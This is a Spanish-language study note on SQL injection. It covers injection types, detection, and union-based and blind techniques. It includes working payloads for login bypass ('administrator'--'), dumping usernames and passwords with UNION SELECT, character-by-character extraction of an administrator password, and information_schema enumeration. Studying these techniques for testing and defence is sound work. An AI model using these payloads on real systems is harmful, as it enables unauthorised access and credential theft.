---
title: sqli
author: naibu3
---

#web 

**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

Algunos ejemplos serían:

```sql
' or 1=1--
*
```

## Conceptos previos

Existen varios **tipos de bases de datos**:

- **Bases de datos relacionales**: Las inyecciones SQL son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas bases de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.
- **Bases de datos NoSQL**: Aunque las inyecciones SQL son menos comunes en bases de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferente. Sin embargo, es posible realizar inyecciones de comandos en las consultas que se realizan en estas bases de datos. Esto lo veremos unas clases más adelante.
- **Bases de datos de grafos**: Las bases de datos de grafos, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los nodos y relaciones que se han almacenado en la base de datos.
- **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.

## Tipos de inyecciones

- **Inyección SQL basada en errores**: Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.
- **Inyección SQL basada en uniones**: Este tipo de inyección SQL utiliza la cláusula “**UNION**” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.
- **Inyección SQL basada en tiempo**: Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional
- **Inyección SQL basada en booleanos**: Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
- **Inyección SQL basada en stacked queries**: Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.

# Detección

Para detectar una inyección SQL, cuando parezca que se está haciendo una petición a una BD, podemos intentar:

- Submitting the single quote character `'` and looking for errors or other anomalies.
- Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
- Submitting Boolean conditions such as `OR 1=1` and `OR 1=2`, and looking for differences in the application's responses.
- Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
- Submitting [OAST](https://portswigger.net/burp/application-security-testing/oast) payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.


# Error based SQLI

Si tenemos una *query* como la siguiente:

```mysql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Podemos tratar de hacer una inyección como la siguiente `' OR 1=1--`, de forma que la query quedaría:

```mysql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

Así se mostrarán todos los productos de la BD.

Otro ejemplo sería un login como el siguiente:

```mysql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Si tratamos de poner **username** con el valor `administrator'--`, la query quedaría:

```mysql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'bluecheese'
```

Viendo el output de las querys podemos determinar distintos datos sobre la BD.

## Detectar número de columnas

Mediante errores podemos ver el número de columnas que se están solicitando con la query. Una forma sería utilizando **ORDER BY**. Si añadimos `ORDER BY 3--` y el número de columnas es inferior a 3, nos devolverá un error.

# UNION based SQLI

Si de igual forma, utilizamos el operador **UNION**, podemos hacer una subconsulta que se añada a la inicial. Esta segunda consulta debe devolver u número de columnas igual, lo cuál puede server también para determinar el número de columnas de una tabla.

```mysql
SELECT name, description FROM products WHERE category = 'Gifts'
```

Con una inyección como `' UNION SELECT username, password FROM users--` la query quedaría:

```mysql
SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--'
```

En ocasiones, la consulta tramitada con UNION no llega a mostrarse, por ello debemos jugar con **group_concat()**, que concatena la consulta principal con la del UNION

## Detectar número de columnas

Con UNION también podemos detectar el número de columnas, mediante inyecciones como:

```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

# Blind SQLI

## Con respuestas condicionales

Por ejemplo, para esta query con un **TrackingId**:

```mysql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Podemos probar a poner la siguiente inyección `<TI> AND 1=2`:

```mysql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4 AND 1=2'
```

Mediente otras técnicas descubrimos que existe la tabla `Users` con las columnas `Username` y `Password`, y un usuario `Administrator`. De esta forma, podemos utilizar una inyección como `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm` para  tratar de sacar la contraseña (si el primer carácter es menor que `m` devolverá un error).

```mysql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'
```

Este proceso lo podemos automatizar haciendo uso de la librería [[pwntools]].

# MySQL

Para obtener información sobre la propia base de datos, podemos utilizar la tabla **information_schema**.

- Nombre de las bases de datos:
```sql
SELECT schema_name FROM information_schema.schemata
```

- Tablas de una base de datos:
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=[database]
```

- Nombres de las columnas:
```sql
SELECT column_name FROM information_schema.columns WHERE table_name=[table name]
```